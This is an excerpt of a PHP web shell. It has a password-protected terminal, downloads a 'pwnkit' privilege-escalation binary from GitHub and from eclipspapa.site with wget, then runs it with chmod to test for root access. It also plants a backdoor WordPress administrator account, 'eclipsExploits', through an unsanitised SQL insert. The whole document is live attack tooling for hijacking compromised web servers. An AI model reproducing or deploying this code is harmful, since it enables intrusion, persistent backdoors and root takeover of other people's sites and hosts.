...
$valid_password_hash = '$1$3w00Vphk$9jnRdkQCqRiFNz6ZzrQmc1'; 
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li class="logo-gecko"><img width="400" height="400" src="https://i.imgur.com/6qpyCQS.png" align="right"></li>
...
function download_file() {
    // URL sumber file
    $url = "https://raw.githubusercontent.com/nerogativgit13/Toolsnerx13/refs/heads/main/bar.css";
    ...
    <?php if ($_GET['terminal'] == "root") : ?>
        <div class="terminal">
            <div class="terminal-container">
                ...
                <div class="terminal-body">
                    <textarea name="" disabled><?php if ($fungsi[3]('.eclips') && $fungsi[3]('pwnkit')) {
                                                    $response = $fungsi[11]('.eclips');
...
if (isset($_POST['submitwp'])) {
    ...
    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'eclipsExploits', '', '', NOW(), '', 0, 'eclipsExploits')";
...
if ($_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        $fungsi[28]("pwnkit", $fungsi[11]("https://github.com/nerogativgit13/Toolsnerx13/raw/refs/heads/main/limaempat"));
        cmd('chmod +x pwnkit');
        echo cmd('./pwnkit "id" > .eclips');
...
"email" : "' . $emailCp . '"
    ...
    if ($_POST['create_folder'] == true) {
        ...
        if (!$fungsi[3]('pwnkit')) {
            cmd('wget https://eclipspapa.site/rootkit/limaempat -O pwnkit');
            cmd('chmod +x pwnkit');
            cmd('./pwnkit "id" > .eclips');
            echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
        } else if ($fungsi[3]('.eclips')) {
            $response = $fungsi[11]('.eclips');
            $r_text = explode(" ", $response);
            if ($r_text[0] == "uid=0(root)") {
